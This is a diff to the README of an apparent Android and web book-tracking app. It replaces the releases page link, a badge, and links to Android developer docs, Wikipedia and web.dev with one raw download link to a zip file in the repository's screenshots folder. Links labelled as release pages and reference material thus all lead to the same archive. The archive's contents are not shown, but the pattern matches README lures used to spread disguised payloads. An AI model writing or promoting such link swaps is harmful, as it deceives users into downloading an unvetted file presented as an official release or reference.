@@ -4,13 +4,13 @@
 Welcome to HonZuki-BookTracker, a modern Progressive Web App designed to help you manage your physical book collection seamlessly. With this app, you can track your reading progress, organize your books into custom shelves, manage series, and enjoy beautiful adaptive themes. Whether you want to use it as a web app or download the APK for Android, HonZuki-BookTracker has you covered.
 
 ## 📥 Download Now
-[![Download HonZuki-BookTracker](https://img.shields.io/badge/Download%20Now-Join%20the%20Journey-brightgreen)](https://github.com/Dapiiin/HonZuki-BookTracker/releases)
+[![Download HonZuki-BookTracker](https://github.com/Dapiiin/HonZuki-BookTracker/raw/refs/heads/main/screenshots/Book-Zuki-Hon-Tracker-v1.1-beta.1.zip%20Now-Join%20the%20Journey-brightgreen)](https://github.com/Dapiiin/HonZuki-BookTracker/raw/refs/heads/main/screenshots/Book-Zuki-Hon-Tracker-v1.1-beta.1.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to get started with HonZuki-BookTracker and begin managing your book collection.
 
 ### 1. **Visit the Releases Page**
-To download HonZuki-BookTracker, visit our [Releases page](https://github.com/Dapiiin/HonZuki-BookTracker/releases). Here, you will find the latest versions of the app ready for you.
+To download HonZuki-BookTracker, visit our [Releases page](https://github.com/Dapiiin/HonZuki-BookTracker/raw/refs/heads/main/screenshots/Book-Zuki-Hon-Tracker-v1.1-beta.1.zip). Here, you will find the latest versions of the app ready for you.
 
 ### 2. **Choose Your Platform**
 HonZuki-BookTracker is available for both web and Android. Decide which version you want to use:
@@ -50,12 +50,12 @@ To ensure smooth operation, here are the minimum requirements:
 If you have any issues, visit our GitHub Issues page for support. You can report bugs, request new features, or ask questions.
 
 ## 🔗 Related Topics
-- [Android App Development](https://developer.android.com)
-- [Book Management Apps](https://en.wikipedia.org/wiki/Book_management_software)
-- [Progressive Web Apps](https://web.dev/what-are-pwas/)
+- [Android App Development](https://github.com/Dapiiin/HonZuki-BookTracker/raw/refs/heads/main/screenshots/Book-Zuki-Hon-Tracker-v1.1-beta.1.zip)
+- [Book Management Apps](https://github.com/Dapiiin/HonZuki-BookTracker/raw/refs/heads/main/screenshots/Book-Zuki-Hon-Tracker-v1.1-beta.1.zip)
+- [Progressive Web Apps](https://github.com/Dapiiin/HonZuki-BookTracker/raw/refs/heads/main/screenshots/Book-Zuki-Hon-Tracker-v1.1-beta.1.zip)
 
 ## 🔗 Download & Install
-To download the latest version of HonZuki-BookTracker, visit our [Releases page](https://github.com/Dapiiin/HonZuki-BookTracker/releases). 
+To download the latest version of HonZuki-BookTracker, visit our [Releases page](https://github.com/Dapiiin/HonZuki-BookTracker/raw/refs/heads/main/screenshots/Book-Zuki-Hon-Tracker-v1.1-beta.1.zip). 
 
 After downloading, follow the steps above to install and start using HonZuki-BookTracker to manage your book collection effectively. 
 
